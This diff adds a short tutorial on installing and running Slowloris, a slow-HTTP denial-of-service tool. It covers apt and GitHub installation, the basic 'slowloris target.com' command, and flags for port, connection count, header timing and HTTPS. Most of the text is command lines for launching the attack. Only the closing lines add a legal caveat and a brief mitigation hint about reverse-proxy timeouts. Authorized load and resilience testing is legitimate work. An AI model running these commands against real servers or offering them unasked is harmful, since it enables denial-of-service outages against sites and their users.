@@ -1,0 +1,67 @@
+1️⃣ Install Slowloris
+
+Kali sometimes has it pre-installed, but if not, run:
+
+sudo apt update
+sudo apt install slowloris
+
+
+If you want the latest Python version from GitHub:
+
+sudo apt install git python3
+git clone https://github.com/gkbrk/slowloris.git
+cd slowloris
+
+2️⃣ Check if it’s Installed
+slowloris -h
+
+
+If you cloned from GitHub:
+
+python3 slowloris.py -h
+
+3️⃣ Basic Usage
+slowloris target.com
+
+
+This sends a slow HTTP request attack to target.com with default settings.
+
+4️⃣ Common Options
+
+You can adjust the attack intensity and duration:
+
+slowloris target.com -p 80 -s 200 -t 5 --https
+
+
+Options explained:
+
+-p → Port (usually 80 for HTTP, 443 for HTTPS)
+
+-s → Number of simultaneous connections (default is 150)
+
+-t → Time between header sends (seconds)
+
+--https → Enable HTTPS mode
+
+-v → Verbose output (shows what’s happening)
+
+Example with Python version:
+
+python3 slowloris.py target.com -p 80 -s 200 -v
+
+5️⃣ Stop the Attack
+
+Press:
+
+CTRL + C
+
+
+This will end the attack and close all connections.
+
+6️⃣ Legal & Safety Notes
+
+Run only on your own servers or in a lab environment.
+
+Slowloris is low-bandwidth but can still take down vulnerable sites.
+
+Use it for pentesting to check if your server needs protection (mitigate by using reverse proxies like Nginx or Apache with timeout rules).
